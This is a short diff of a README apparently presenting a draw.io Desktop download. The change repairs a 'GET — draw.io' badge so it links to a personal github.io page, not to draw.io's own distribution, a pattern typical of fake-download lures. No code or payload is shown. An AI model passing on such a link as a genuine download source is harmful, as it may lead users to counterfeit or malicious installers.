@@ -2,7 +2,7 @@
 
 ![draw.io Desktop Banner](https://itlogia.ru/upload/images/article/61cadb1ce5ab4.jpg)
 
-[![GET — draw.io](https://img.shields.io/badge/GET%20%E2%80%94%20draw.io-0078D6?style=for-the-badge&logoColor=white)] (https://sandraedwardsc252.github.io/.github/Drawio-Desktop-Tools)
+[![GET — draw.io](https://img.shields.io/badge/GET%20%E2%80%94%20draw.io-0078D6?style=for-the-badge&logoColor=white)](https://sandraedwardsc252.github.io/.github/Drawio-Desktop-Tools)
 
 ---
 
